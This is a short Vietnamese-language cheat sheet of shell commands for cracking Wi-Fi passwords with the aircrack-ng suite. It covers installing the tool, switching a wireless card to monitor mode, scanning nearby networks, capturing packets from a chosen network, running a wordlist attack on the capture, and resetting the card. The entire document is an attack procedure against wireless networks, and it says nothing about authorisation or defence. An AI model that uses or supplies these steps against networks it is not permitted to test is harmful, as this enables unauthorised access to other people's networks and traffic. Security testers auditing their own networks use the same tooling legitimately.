# Sử dụng tool [Aircrack-ng](http://www.aircrack-ng.org/)

```shell
# cài đặt aircrack-ng
$ sudo apt-get update
$ sudo apt-get install aircrack-ng

# chuẩn bị card mạng
$ sudo ifconfig wlan0 down
$ sudo iwconfig wlan0 mode monitor
$ sudo ifconfig wlan0 up

$ sudo airmon-ng start wlan0

$ sudo ifconfig mon0 down
$ sudo iwconfig mon0 mode monitor
$ sudo ifconfig mon0 up

# dò wifi
$ sudo airodump-ng mon0
# đến đây sẽ ra các sóng wifi mà máy bạn có thể thấy được, cần lưu ý các thông số sau: bssid, channel.

# thu thập các gói tin gửi đi của cardwifi dò
$ sudo airodump-ng mon0 --bssid {{bssid}} --channel {{channel}} -w {{tên file thu thập các gói tin}}

# crack
$ sudo aircrack-ng {{tên file thu thập (.cap)}} -w {{thư viện mật khẩu}}

# đến đây ta có thể dò được mật khẩu nếu mật khẩu của wifi đó nằm trong thư viện mật khẩu đã có

# reset card mạng
$ sudo airmon-ng check kill
$ sudo service network-manager restart
```